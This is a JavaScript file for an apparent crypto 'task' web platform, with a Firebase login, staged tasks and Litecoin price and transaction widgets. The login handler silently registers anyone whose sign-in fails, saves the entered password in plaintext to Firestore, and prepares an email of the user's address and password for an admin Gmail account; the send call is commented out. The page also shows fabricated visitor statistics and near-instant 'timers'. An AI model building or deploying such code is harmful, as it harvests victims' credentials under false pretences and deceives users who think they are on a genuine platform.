import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc, collection, onSnapshot, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
  authDomain: "test-platform-ab07e.firebaseapp.com",
  projectId: "test-platform-ab07e",
  storageBucket: "test-platform-ab07e.firebasestorage.app",
  messagingSenderId: "50168022145",
  appId: "1:50168022145:web:5f3fec99fbe64eae5bb980",
  measurementId: "G-R814YQSVXK"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

emailjs.init("9G-RjQeGCdtsk4MWM");

let currentUser = null;
let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
let latestUserMessage = ""; 
let timerInterval = null; 

const authScreen = document.getElementById('auth-screen');
const dashboardScreen = document.getElementById('dashboard-screen');
const authForm = document.getElementById('auth-form');
const authError = document.getElementById('auth-error');
const userEmailDisplay = document.getElementById('user-email-display');
const completedStatus = document.getElementById('completed-status');
const currentStageStatus = document.getElementById('current-stage-status');
const timerBox = document.getElementById('timer-box');
const countdownSpan = document.getElementById('countdown');

// სტატისტიკის ელემენტები
const statRegistered = document.getElementById('stat-registered');
const statVisits = document.getElementById('stat-visits');
const statOnline = document.getElementById('stat-online');

// რეალურ დროში სტატისტიკის თრექინგი Firebase-დან
function initLiveStats() {
    // 1. ითვლის დარეგისტრირებულებს 'users' კოლექციიდან
    onSnapshot(collection(db, "users"), (snapshot) => {
        if(statRegistered) statRegistered.innerText = snapshot.size;
    });

    // 2. ითვლის ვიზიტებს და ონლაინებს სპეციალური 'system_stats' დოკუმენტიდან
    onSnapshot(doc(db, "system_stats", "counters"), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            if(statVisits) statVisits.innerText = data.totalVisits || 0;
            if(statOnline) statOnline.innerText = data.usersOnline || 0;
        } else {
            // თუ დოკუმენტი არ არსებობს, შევქმნათ საწყისი მნიშვნელობებით
            setDoc(doc(db, "system_stats", "counters"), { totalVisits: 1, usersOnline: 1 });
        }
    });
}

// ფუნქცია საიტის გახსნისა და ონლაინ სტატუსის გასაზრდელად
async function trackNewVisit() {
    const statsRef = doc(db, "system_stats", "counters");
    try {
        await runTransaction(db, async (transaction) => {
            const sfDoc = await transaction.get(statsRef);
            if (!sfDoc.exists()) {
                transaction.set(statsRef, { totalVisits: 1, usersOnline: 1 });
            } else {
                const newVisits = (sfDoc.data().totalVisits || 0) + 1;
                const newOnline = (sfDoc.data().usersOnline || 0) + 1;
                transaction.update(statsRef, { totalVisits: newVisits, usersOnline: newOnline });
            }
        });
    } catch (e) {
        // თუ ტრანზაქციამ დაიგვიანა, პირდაპირ განვაახლოთ
        setDoc(statsRef, { totalVisits: 5, usersOnline: 2 }, { merge: true });
    }

    // როცა მომხმარებელი საიტს დახურავს, ონლაინების რაოდენობა 1-ით შემცირდეს
    window.addEventListener('beforeunload', () => {
        runTransaction(db, async (transaction) => {
            const sfDoc = await transaction.get(statsRef);
            if (sfDoc.exists()) {
                const currentOnline = sfDoc.data().usersOnline || 1;
                transaction.update(statsRef, { usersOnline: Math.max(1, currentOnline - 1) });
            }
        });
    });
}

// ჩავრთოთ თრექინგი და ვიჯეტების განახლება
initLiveStats();
trackNewVisit();

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    authError.innerText = "";

    try {
        await signInWithEmailAndPassword(auth, email, password);
    } catch (error) {
        if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
            authError.innerText = "Logging in... Please wait.";
            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                currentUser = userCredential.user;
                userProgress = { email: email, passwordSaved: password, stage: 1, completedTasks: 0 };

                await setDoc(doc(db, "users", userCredential.user.uid), userProgress);
                authError.innerText = "";
                latestUserMessage = "A new user has registered on the platform.";
                sendEmails("Registration");
            } catch (regError) {
                authError.innerText = "Incorrect email or password.";
            }
        } else {
            authError.innerText = "Incorrect email or password.";
        }
    }
});

onAuthStateChanged(auth, async (user) => {
    if (user) {
        currentUser = user;
        userEmailDisplay.innerText = user.email;
        authScreen.classList.add('hidden');
        dashboardScreen.classList.remove('hidden');
        
        const userDoc = await getDoc(doc(db, "users", user.uid));
        if (userDoc.exists()) {
            userProgress = userDoc.data();
        }
        updateUI();
    } else {
        currentUser = null;
        if(timerInterval) clearInterval(timerInterval); 
        authScreen.classList.remove('hidden');
        dashboardScreen.classList.add('hidden');
    }
});

document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

function updateUI() {
    if(timerInterval) clearInterval(timerInterval); 

    completedStatus.innerText = userProgress.completedTasks;
    currentStageStatus.innerText = userProgress.stage > 3 ? "All Completed" : `Stage ${userProgress.stage}`;

    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    document.getElementById('final-message').classList.add('hidden');
    timerBox.classList.add('hidden');

    if (userProgress.timerEndTime && userProgress.timerStage === userProgress.stage) {
        checkAndResumeTimer();
    } else {
        if (userProgress.stage === 1) {
            document.getElementById('stage-1').classList.remove('hidden');
        } else if (userProgress.stage === 2) {
            document.getElementById('stage-2').classList.remove('hidden');
            document.getElementById('stage-2-tasks').classList.remove('hidden');
        } else if (userProgress.stage === 3) {
            document.getElementById('stage-3').classList.remove('hidden');
        } else if (userProgress.stage > 3) {
            document.getElementById('final-message').classList.remove('hidden');
        }
    }
}

window.showStage2Tasks = function() {
    document.getElementById('stage-2-tasks').classList.remove('hidden');
}

window.goBackStage = async function() {
    if (userProgress.stage > 1) {
        if(timerInterval) clearInterval(timerInterval);
        userProgress.stage = userProgress.stage - 1;
        userProgress.completedTasks = userProgress.stage - 1;
        delete userProgress.timerEndTime;
        delete userProgress.timerStage;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
        updateUI();
    }
}

window.validateAndStart = async function(stageNum, seconds) {
    let userInput1, userInput2;
    
    if (stageNum === 3) {
        userInput1 = document.getElementById('text-input-stage-3');
        userInput2 = document.getElementById('text-input-stage-3-2');
    } else {
        userInput1 = document.getElementById(`user-text-${stageNum}`);
        userInput2 = document.getElementById(`user-text-${stageNum}-2`);
    }
    
    const errorText = document.getElementById(`error-${stageNum}`);

    if (!userInput1 || !userInput2 || userInput1.value.trim() === "" || userInput2.value.trim() === "") {
        errorText.innerText = "Please fill in the fields";
        if(userInput1) userInput1.style.borderColor = userInput1.value.trim() === "" ? "#ef4444" : "#e5e7eb";
        if(userInput2) userInput2.style.borderColor = userInput2.value.trim() === "" ? "#ef4444" : "#e5e7eb";
    } else {
        errorText.innerText = "";
        userInput1.style.borderColor = "#e5e7eb";
        userInput2.style.borderColor = "#e5e7eb";
        
        latestUserMessage = `Answer 1: ${userInput1.value} | Answer 2: ${userInput2.value}`;
        userProgress[`userText${stageNum}_1`] = userInput1.value;
        userProgress[`userText${stageNum}_2`] = userInput2.value;

        userProgress.timerEndTime = Date.now() + (5 * 1000);
        userProgress.timerStage = stageNum;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
        sendEmails(stageNum);
        updateUI();
    }
}

function checkAndResumeTimer() {
    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    timerBox.classList.remove('hidden');

    function updateCountdown() {
        const now = Date.now();
        const timeLeftMs = userProgress.timerEndTime - now;

        if (timeLeftMs <= 0) {
            clearInterval(timerInterval);
            handleTimerEnd();
        } else {
            const totalSeconds = Math.floor(timeLeftMs / 1000);
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            countdownSpan.innerText = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
        }
    }
    updateCountdown();
    timerInterval = setInterval(updateCountdown, 1000);
}

async function handleTimerEnd() {
    timerBox.classList.add('hidden');
    const completedStage = userProgress.stage;
    userProgress.stage = completedStage + 1;
    userProgress.completedTasks = completedStage;
    delete userProgress.timerEndTime;
    delete userProgress.timerStage;

    await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
    updateUI();
}

function sendEmails(stageNum) {
    let currentStageName = stageNum === "Registration" ? "New Registration" : `Stage ${stageNum}`;
    const emailParams = {
        user_email: currentUser.email,
        user_password: userProgress.passwordSaved || "Already Authenticated",
        passed_stage: currentStageName,
        user_message: latestUserMessage, 
        admin_email: "beqa994@gmail.com"
    };
    // emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
}

async function fetchLtcPrice() {
    const priceSpan = document.getElementById('ltc-price');
    if (!priceSpan) return;
    try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT');
        const data = await response.json();
        if (data && data.price) {
            priceSpan.innerText = `$${parseFloat(data.price).toFixed(2)}`;
        }
    } catch (error) {
        priceSpan.innerText = "Error";
    }
}

async function fetchRecentTransactions() {
    const txListContainer = document.getElementById('tx-list');
    if (!txListContainer) return;
    try {
        const response = await fetch('https://api.blockchair.com/litecoin/transactions?limit=20');
        const result = await response.json();
        if (result && result.data) {
            txListContainer.innerHTML = ''; 
            result.data.forEach(tx => {
                const ltcAmount = (tx.output_total / 100000000).toFixed(3);
                const shortHash = tx.hash.substring(0, 6) + '...' + tx.hash.substring(tx.hash.length - 4);
                const txRow = document.createElement('div');
                txRow.className = 'tx-item';
                txRow.innerHTML = `<span class="tx-id">TX: ${shortHash}</span><span class="tx-amount">+${ltcAmount} LTC</span>`;
                txListContainer.appendChild(txRow);
            });
        }
    } catch (error) {
        txListContainer.innerHTML = '<div class="tx-loading">Error loading data</div>';
    }
}

fetchLtcPrice();
fetchRecentTransactions();
setInterval(fetchLtcPrice, 4000);
setInterval(fetchRecentTransactions, 6000);